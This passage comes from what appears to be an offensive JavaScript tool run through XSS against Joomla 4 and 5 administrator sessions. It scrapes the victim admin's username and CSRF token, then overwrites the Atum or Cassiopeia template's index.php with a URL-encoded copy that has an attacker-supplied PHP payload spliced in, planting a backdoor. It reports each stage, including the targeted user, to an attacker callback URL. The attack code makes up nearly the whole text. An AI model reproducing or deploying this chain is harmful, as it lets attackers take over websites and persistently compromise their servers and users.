0A%3C%3Fphp+%2F%2F+Wrapper+%3F%3E%0D%0A%3Cdiv+id%3D%22wrapper%22+class%3D%22d-flex+wrapper%3C%3Fphp+echo+%24hiddenMenu+%3F+%270%27+%3A+%27%27%3B+%3F%3E+%3C%3Fphp+echo+%24sidebarState%3B+%3F%3E%22%3E%0D%0A++++%3C%3Fphp+%2F%2F+Sidebar+%3F%3E%0D%0A++++%3C%3Fphp+if+%28%21%24hiddenMenu%29+%3A+%3F%3E%0D%0A++++++++%3C%3Fphp+HTMLHelper%3A%3A_%28%27bootstrap.collapse%27%2C+%27.toggler-burger%27%29%3B+%3F%3E%0D%0A++++++++%3Cbutton+class%3D%22navbar-toggler+toggler-burger+collapsed%22+type%3D%22button%22+data-bs-toggle%3D%22collapse%22+data-bs-target%3D%22%23sidebar-wrapper%22+aria-controls%3D%22sidebar-wrapper%22+aria-expanded%3D%22false%22+aria-label%3D%22%3C%3Fphp+echo+Text%3A%3A_%28%27JTOGGLE_SIDEBAR_MENU%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++%3Cspan+class%3D%22navbar-toggler-icon%22%3E%3C%2Fspan%3E%0D%0A++++++++%3C%2Fbutton%3E%0D%0A%0D%0A++++++++%3Cdiv+id%3D%22sidebar-wrapper%22+class%3D%22sidebar-wrapper+sidebar-menu%22+%3C%3Fphp+echo+%24hiddenMenu+%3F+%27data-hidden%3D%22%27+.+%24hiddenMenu+.+%27%22%27+%3A+%27%27%3B+%3F%3E%3E%0D%0A++++++++++++%3Cdiv+id%3D%22sidebarmenu%22+class%3D%22sidebar-sticky%22%3E%0D%0A++++++++++++++++%3Cdiv+class%3D%22sidebar-toggle+item+item-level-1%22%3E%0D%0A++++++++++++++++++++%3Ca+id%3D%22menu-collapse%22+href%3D%22%23%22+aria-label%3D%22%3C%3Fphp+echo+Text%3A%3A_%28%27JTOGGLE_SIDEBAR_MENU%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++++++++++++++%3Cspan+id%3D%22menu-collapse-icon%22+class%3D%22%3C%3Fphp+echo+%24sidebarState+%3D%3D%3D+%27closed%27+%3F+%27icon-toggle-on%27+%3A+%27icon-toggle-off%27%3B+%3F%3E+icon-fw%22+aria-hidden%3D%22true%22%3E%3C%2Fspan%3E%0D%0A++++++++++++++++++++++++%3Cspan+class%3D%22sidebar-item-title%22%3E%3C%3Fphp+echo+Text%3A%3A_%28%27JTOGGLE_SIDEBAR_MENU%27%29%3B+%3F%3E%3C%2Fspan%3E%0D%0A++++++++++++++++++++%3C%2Fa%3E%0D%0A++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22menu%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++%3C%3Fphp+%2F%2F+container-fluid+%3F%3E%0D%0A++++%3Cdiv+class%3D%22container-fluid+container-main%22%3E%0D%0A++++++++%3C%3Fphp+if+%28%21%24cpanel%29+%3A+%3F%3E%0D%0A++++++++++++%3C%3Fphp+%2F%2F+Subheader+%3F%3E%0D%0A++++++++++++%3C%3Fphp+HTMLHelper%3A%3A_%28%27bootstrap.collapse%27%2C+%27.toggler-toolbar%27%29%3B+%3F%3E%0D%0A++++++++++++%3Cbutton+class%3D%22navbar-toggler+toggler-toolbar+toggler-burger+collapsed%22+type%3D%22button%22+data-bs-toggle%3D%22collapse%22+data-bs-target%3D%22%23subhead-container%22+aria-controls%3D%22subhead-container%22+aria-expanded%3D%22false%22+aria-label%3D%22%3C%3Fphp+echo+Text%3A%3A_%28%27TPL_ATUM_TOOLBAR%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++++++%3Cspan+class%3D%22toggler-toolbar-icon%22%3E%3C%2Fspan%3E%0D%0A++++++++++++%3C%2Fbutton%3E%0D%0A++++++++++++%3Cdiv+id%3D%22subhead-container%22+class%3D%22subhead+mb-3%22%3E%0D%0A++++++++++++++++%3Cdiv+class%3D%22row%22%3E%0D%0A++++++++++++++++++++%3Cdiv+class%3D%22col-md-12%22%3E%0D%0A++++++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22toolbar%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++%3Csection+id%3D%22content%22+class%3D%22content%22%3E%0D%0A++++++++++++%3C%3Fphp+%2F%2F+Begin+Content+%3F%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22top%22+style%3D%22html5%22+%2F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22row%22%3E%0D%0A++++++++++++++++%3Cdiv+class%3D%22col-md-12%22%3E%0D%0A++++++++++++++++++++%3Cmain%3E%0D%0A++++++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22message%22+%2F%3E%0D%0A++++++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22component%22+%2F%3E%0D%0A++++++++++++++++++++%3C%2Fmain%3E%0D%0A++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27bottom%27%29%29+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22bottom%22+style%3D%22html5%22+%2F%3E%0D%0A++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++%3C%3Fphp+%2F%2F+End+Content+%3F%3E%0D%0A++++++++%3C%2Fsection%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22debug%22+style%3D%22none%22+%2F%3E%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A" +
                    "&task=template.save&" +
                    csrf_token + "=1&jform%5Bextension_id%5D=" +
                    ID + "&jform%5Bfilename%5D=%2Fproc%2Fself%2Fcwd%2Findex.php"

                );

                // Check if the file was edited successfully
                if (_stage2.responseText.match("File saved.")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "(Stage 2) - (Atum) Template Edited Sucessfuly! <file: index.php>",
                                    "Module": "JLEditTemplates.Atum5()",
                                    "About": "You can trigger your backdoor in file/endpoint on the Administrator Panel",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "ERROR: (Stage 2) - Cannot Edit (Atum) Template",
                                    "Module": "JLEditTemplates.Atum5()",
                                    "About": "The user doesn't have (Super Users) Permission",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=1",
                            "Module": "JLEditTemplates.Atum5()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

    // Joomla 4.x.x Site Template: (Cassiopeia)
    function Cassiopeia4() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_templates&view=templates&client_id=0", false);
        _stage1.send();

        if (_stage1.responseText) {

            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=0",
                                "Module": "JLEditTemplates.Cassiopeia4()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + "administrator/index.php?option=com_admin&view=profile&layout=edit", false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/"csrf\.token":"([^"]+)"/)[1];

                // Extract (Cassiopeia) Template URI
                var templateURI = _stage1.responseText.match(/<a[^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>(?:\s*Cassiopeia Details and Files\s*)?<\/a>/i)[1];
                templateURI = templateURI.replace(/&amp;/g, '&');
                templateURI = templateURI.replace(/(\?|&)file=([^&]*)/, `$1file=L2luZGV4LnBocA`);
                templateURI = templateURI.substring(1);

                // Get the ID of the Template URI
                var ID = templateURI.match(/[?&]id=([^&]+)/)[1];

                // Edit index.php file
                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + templateURI, false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send(
                    "isMedia=0&jform%5Bsource%5D=%3C%3Fphp%0D%0A%0D%0A%2F**%0D%0A+*+%40package+++++Joomla.Site%0D%0A+*+%40subpackage++Templates.cassiopeia%0D%0A+*%0D%0A+*+%40copyright+++%28C%29+2017+Open+Source+Matters%2C+Inc.+%3Chttps%3A%2F%2Fwww.joomla.org%3E%0D%0A+*+%40license+++++GNU+General+Public+License+version+2+or+later%3B+see+LICENSE.txt%0D%0A+*%2F%0D%0A%0D%0Adefined%28%27_JEXEC%27%29+or+die%3B%0D%0A%0D%0Ause+Joomla%5CCMS%5CFactory%3B%0D%0Ause+Joomla%5CCMS%5CHTML%5CHTMLHelper%3B%0D%0Ause+Joomla%5CCMS%5CLanguage%5CText%3B%0D%0Ause+Joomla%5CCMS%5CUri%5CUri%3B%0D%0A%0D%0A%2F**+%40var+Joomla%5CCMS%5CDocument%5CHtmlDocument+%24this+*%2F%0D%0A%0D%0A%24app+++%3D+Factory%3A%3AgetApplication%28%29%3B%0D%0A%24input+%3D+%24app-%3EgetInput%28%29%3B%0D%0A%24wa++++%3D+%24this-%3EgetWebAssetManager%28%29%3B%0D%0A%0D%0A%2F%2F+Browsers+support+SVG+favicons%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27joomla-favicon.svg%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27icon%27%2C+%27rel%27%2C+%5B%27type%27+%3D%3E+%27image%2Fsvg%2Bxml%27%5D%29%3B%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27favicon.ico%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27alternate+icon%27%2C+%27rel%27%2C+%5B%27type%27+%3D%3E+%27image%2Fvnd.microsoft.icon%27%5D%29%3B%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27joomla-favicon-pinned.svg%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27mask-icon%27%2C+%27rel%27%2C+%5B%27color%27+%3D%3E+%27%23000%27%5D%29%3B%0D%0A%0D%0A%2F%2F+Detecting+Active+Variables%0D%0A%24option+++%3D+%24input-%3EgetCmd%28%27option%27%2C+%27%27%29%3B%0D%0A%24view+++++%3D+%24input-%3EgetCmd%28%27view%27%2C+%27%27%29%3B%0D%0A%24layout+++%3D+%24input-%3EgetCmd%28%27layout%27%2C+%27%27%29%3B%0D%0A%24task+++++%3D+%24input-%3EgetCmd%28%27task%27%2C+%27%27%29%3B%0D%0A%24itemid+++%3D+%24input-%3EgetCmd%28%27Itemid%27%2C+%27%27%29%3B%0D%0A%24sitename+%3D+htmlspecialchars%28%24app-%3Eget%28%27sitename%27%29%2C+ENT_QUOTES%2C+%27UTF-8%27%29%3B%0D%0A%24menu+++++%3D+%24app-%3EgetMenu%28%29-%3EgetActive%28%29%3B%0D%0A%24pageclass+%3D+%24menu+%21%3D%3D+null+%3F+%24menu-%3EgetParams%28%29-%3Eget%28%27pageclass_sfx%27%2C+%27%27%29+%3A+%27%27%3B%0D%0A%0D%0A%2F%2F+Color+Theme%0D%0A%24paramsColorName+%3D+%24this-%3Eparams-%3Eget%28%27colorName%27%2C+%27colors_standard%27%29%3B%0D%0A%24assetColorName++%3D+%27theme.%27+.+%24paramsColorName%3B%0D%0A%24wa-%3EregisterAndUseStyle%28%24assetColorName%2C+%27media%2Ftemplates%2Fsite%2Fcassiopeia%2Fcss%2Fglobal%2F%27+.+%24paramsColorName+.+%27.css%27%29%3B%0D%0A%0D%0A%2F%2F+Use+a+font+scheme+if+set+in+the+template+style+options%0D%0A%24paramsFontScheme+%3D+%24this-%3Eparams-%3Eget%28%27useFontScheme%27%2C+false%29%3B%0D%0A%24fontStyles+++++++%3D+%27%27%3B%0D%0A%0D%0Aif+%28%24paramsFontScheme%29+%7B%0D%0A++++if+%28stripos%28%24paramsFontScheme%2C+%27https%3A%2F%2F%27%29+%3D%3D%3D+0%29+%7B%0D%0A++++++++%24this-%3EgetPreloadManager%28%29-%3Epreconnect%28%27https%3A%2F%2Ffonts.googleapis.com%2F%27%2C+%5B%27crossorigin%27+%3D%3E+%27anonymous%27%5D%29%3B%0D%0A++++++++%24this-%3EgetPreloadManager%28%29-%3Epreconnect%28%27https%3A%2F%2Ffonts.gstatic.com%2F%27%2C+%5B%27crossorigin%27+%3D%3E+%27anonymous%27%5D%29%3B%0D%0A++++++++%24this-%3EgetPreloadManager%28%29-%3Epreload%28%24paramsFontScheme%2C+%5B%27as%27+%3D%3E+%27style%27%2C+%27crossorigin%27+%3D%3E+%27anonymous%27%5D%29%3B%0D%0A++++++++%24wa-%3EregisterAndUseStyle%28%27fontscheme.current%27%2C+%24paramsFontScheme%2C+%5B%5D%2C+%5B%27media%27+%3D%3E+%27print%27%2C+%27rel%27+%3D%3E+%27lazy-stylesheet%27%2C+%27onload%27+%3D%3E+%27this.media%3D%5C%27all%5C%27%27%2C+%27crossorigin%27+%3D%3E+%27anonymous%27%5D%29%3B%0D%0A%0D%0A++++++++if+%28preg_match_all%28%27%2Ffamily%3D%28%5B%5E%3F%3A%5D*%29%3A%2Fi%27%2C+%24paramsFontScheme%2C+%24matches%29+%3E+0%29+%7B%0D%0A++++++++++++%24fontStyles+%3D+%27--cassiopeia-font-family-body%3A+%22%27+.+str_replace%28%27%2B%27%2C+%27+%27%2C+%24matches%5B1%5D%5B0%5D%29+.+%27%22%2C+sans-serif%3B%0D%0A%09%09%09--cassiopeia-font-family-headings%3A+%22%27+.+str_replace%28%27%2B%27%2C+%27+%27%2C+isset%28%24matches%5B1%5D%5B1%5D%29+%3F+%24matches%5B1%5D%5B1%5D+%3A+%24matches%5B1%5D%5B0%5D%29+.+%27%22%2C+sans-serif%3B%0D%0A%09%09%09--cassiopeia-font-weight-normal%3A+400%3B%0D%0A%09%09%09--cassiopeia-font-weight-headings%3A+700%3B%27%3B%0D%0A++++++++%7D%0D%0A++++%7D+else+%7B%0D%0A++++++++%24wa-%3EregisterAndUseStyle%28%27fontscheme.current%27%2C+%24paramsFontScheme%2C+%5B%27version%27+%3D%3E+%27auto%27%5D%2C+%5B%27media%27+%3D%3E+%27print%27%2C+%27rel%27+%3D%3E+%27lazy-stylesheet%27%2C+%27onload%27+%3D%3E+%27this.media%3D%5C%27all%5C%27%27%5D%29%3B%0D%0A++++++++%24this-%3EgetPreloadManager%28%29-%3Epreload%28%24wa-%3EgetAsset%28%27style%27%2C+%27fontscheme.current%27%29-%3EgetUri%28%29+.+%27%3F%27+.+%24this-%3EgetMediaVersion%28%29%2C+%5B%27as%27+%3D%3E+%27style%27%5D%29%3B%0D%0A++++%7D%0D%0A%7D%0D%0A%0D%0A%2F%2F+Enable+assets%0D%0A%24wa-%3EusePreset%28%27template.cassiopeia.%27+.+%28%24this-%3Edirection+%3D%3D%3D+%27rtl%27+%3F+%27rtl%27+%3A+%27ltr%27%29%29%0D%0A++++-%3EuseStyle%28%27template.active.language%27%29%0D%0A++++-%3EuseStyle%28%27template.user%27%29%0D%0A++++-%3EuseScript%28%27template.user%27%29%0D%0A++++-%3EaddInlineStyle%28%22%3Aroot+%7B%0D%0A%09%09--hue%3A+214%3B%0D%0A%09%09--template-bg-light%3A+%23f0f4fb%3B%0D%0A%09%09--template-text-dark%3A+%23495057%3B%0D%0A%09%09--template-text-light%3A+%23ffffff%3B%0D%0A%09%09--template-link-color%3A+var%28--link-color%29%3B%0D%0A%09%09--template-special-color%3A+%23001B4C%3B%0D%0A%09%09%24fontStyles%0D%0A%09%7D%22%29%3B%0D%0A%0D%0A%2F%2F+Override+%27template.active%27+asset+to+set+correct+ltr%2Frtl+dependency%0D%0A%24wa-%3EregisterStyle%28%27template.active%27%2C+%27%27%2C+%5B%5D%2C+%5B%5D%2C+%5B%27template.cassiopeia.%27+.+%28%24this-%3Edirection+%3D%3D%3D+%27rtl%27+%3F+%27rtl%27+%3A+%27ltr%27%29%5D%29%3B%0D%0A%0D%0A" +
                    encodeURIComponent(payload) +
                    "%0D%0A%0D%0A%2F%2F+Logo+file+or+site+title+param%0D%0Aif+%28%24this-%3Eparams-%3Eget%28%27logoFile%27%29%29+%7B%0D%0A++++%24logo+%3D+HTMLHelper%3A%3A_%28%27image%27%2C+Uri%3A%3Aroot%28false%29+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoFile%27%29%2C+ENT_QUOTES%29%2C+%24sitename%2C+%5B%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B%0D%0A%7D+elseif+%28%24this-%3Eparams-%3Eget%28%27siteTitle%27%29%29+%7B%0D%0A++++%24logo+%3D+%27%3Cspan+title%3D%22%27+.+%24sitename+.+%27%22%3E%27+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27siteTitle%27%29%2C+ENT_COMPAT%2C+%27UTF-8%27%29+.+%27%3C%2Fspan%3E%27%3B%0D%0A%7D+else+%7B%0D%0A++++%24logo+%3D+HTMLHelper%3A%3A_%28%27image%27%2C+%27logo.svg%27%2C+%24sitename%2C+%5B%27class%27+%3D%3E+%27logo+d-inline-block%27%2C+%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+true%2C+0%29%3B%0D%0A%7D%0D%0A%0D%0A%24hasClass+%3D+%27%27%3B%0D%0A%0D%0Aif+%28%24this-%3EcountModules%28%27sidebar-left%27%2C+true%29%29+%7B%0D%0A++++%24hasClass+.%3D+%27+has-sidebar-left%27%3B%0D%0A%7D%0D%0A%0D%0Aif+%28%24this-%3EcountModules%28%27sidebar-right%27%2C+true%29%29+%7B%0D%0A++++%24hasClass+.%3D+%27+has-sidebar-right%27%3B%0D%0A%7D%0D%0A%0D%0A%2F%2F+Container%0D%0A%24wrapper+%3D+%24this-%3Eparams-%3Eget%28%27fluidContainer%27%29+%3F+%27wrapper-fluid%27+%3A+%27wrapper-static%27%3B%0D%0A%0D%0A%24this-%3EsetMetaData%28%27viewport%27%2C+%27width%3Ddevice-width%2C+initial-scale%3D1%27%29%3B%0D%0A%0D%0A%24stickyHeader+%3D+%24this-%3Eparams-%3Eget%28%27stickyHeader%27%29+%3F+%27position-sticky+sticky-top%27+%3A+%27%27%3B%0D%0A%0D%0A%2F%2F+Defer+fontawesome+for+increased+performance.+Once+the+page+is+loaded+javascript+changes+it+to+a+stylesheet.%0D%0A%24wa-%3EgetAsset%28%27style%27%2C+%27fontawesome%27%29-%3EsetAttribute%28%27rel%27%2C+%27lazy-stylesheet%27%29%3B%0D%0A%3F%3E%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22%3C%3Fphp+echo+%24this-%3Elanguage%3B+%3F%3E%22+dir%3D%22%3C%3Fphp+echo+%24this-%3Edirection%3B+%3F%3E%22%3E%0D%0A%3Chead%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22metas%22+%2F%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22styles%22+%2F%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22scripts%22+%2F%3E%0D%0A%3C%2Fhead%3E%0D%0A%0D%0A%3Cbody+class%3D%22site+%3C%3Fphp+echo+%24option%0D%0A++++.+%27+%27+.+%24wrapper%0D%0A++++.+%27+view-%27+.+%24view%0D%0A++++.+%28%24layout+%3F+%27+layout-%27+.+%24layout+%3A+%27+no-layout%27%29%0D%0A++++.+%28%24task+%3F+%27+task-%27+.+%24task+%3A+%27+no-task%27%29%0D%0A++++.+%28%24itemid+%3F+%27+itemid-%27+.+%24itemid+%3A+%27%27%29%0D%0A++++.+%28%24pageclass+%3F+%27+%27+.+%24pageclass+%3A+%27%27%29%0D%0A++++.+%24hasClass%0D%0A++++.+%28%24this-%3Edirection+%3D%3D+%27rtl%27+%3F+%27+rtl%27+%3A+%27%27%29%3B%0D%0A%3F%3E%22%3E%0D%0A++++%3Cheader+class%3D%22header+container-header+full-width%3C%3Fphp+echo+%24stickyHeader+%3F+%27+%27+.+%24stickyHeader+%3A+%27%27%3B+%3F%3E%22%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27topbar%27%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22container-topbar%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22topbar%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27below-top%27%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-below-top%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22below-top%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3Eparams-%3Eget%28%27brand%27%2C+1%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child%22%3E%0D%0A++++++++++++++++%3Cdiv+class%3D%22navbar-brand%22%3E%0D%0A++++++++++++++++++++%3Ca+class%3D%22brand-logo%22+href%3D%22%3C%3Fphp+echo+%24this-%3Ebaseurl%3B+%3F%3E%2F%22%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+%24logo%3B+%3F%3E%0D%0A++++++++++++++++++++%3C%2Fa%3E%0D%0A++++++++++++++++++++%3C%3Fphp+if+%28%24this-%3Eparams-%3Eget%28%27siteDescription%27%29%29+%3A+%3F%3E%0D%0A++++++++++++++++++++++++%3Cdiv+class%3D%22site-description%22%3E%3C%3Fphp+echo+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27siteDescription%27%29%29%3B+%3F%3E%3C%2Fdiv%3E%0D%0A++++++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27menu%27%2C+true%29+%7C%7C+%24this-%3EcountModules%28%27search%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22grid-child+container-nav%22%3E%0D%0A++++++++++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27menu%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22menu%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27search%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Cdiv+class%3D%22container-search%22%3E%0D%0A++++++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22search%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++%3C%2Fheader%3E%0D%0A%0D%0A++++%3Cdiv+class%3D%22site-grid%22%3E%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27banner%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22container-banner+full-width%22%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22banner%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27top-a%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++%3Cdiv+class%3D%22grid-child+container-top-a%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22top-a%22+style%3D%22card%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27top-b%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++%3Cdiv+class%3D%22grid-child+container-top-b%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22top-b%22+style%3D%22card%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27sidebar-left%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++%3Cdiv+class%3D%22grid-child+container-sidebar-left%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22sidebar-left%22+style%3D%22card%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3Cdiv+class%3D%22grid-child+container-component%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22breadcrumbs%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22main-top%22+style%3D%22card%22+%2F%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22message%22+%2F%3E%0D%0A++++++++++++%3Cmain%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22component%22+%2F%3E%0D%0A++++++++++++%3C%2Fmain%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22main-bottom%22+style%3D%22card%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27sidebar-right%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++%3Cdiv+class%3D%22grid-child+container-sidebar-right%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22sidebar-right%22+style%3D%22card%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27bottom-a%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++%3Cdiv+class%3D%22grid-child+container-bottom-a%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22bottom-a%22+style%3D%22card%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27bottom-b%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++++++%3Cdiv+class%3D%22grid-child+container-bottom-b%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22bottom-b%22+style%3D%22card%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%0D%0A++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27footer%27%2C+true%29%29+%3A+%3F%3E%0D%0A++++%3Cfooter+class%3D%22container-footer+footer+full-width%22%3E%0D%0A++++++++%3Cdiv+class%3D%22grid-child%22%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22footer%22+style%3D%22none%22+%2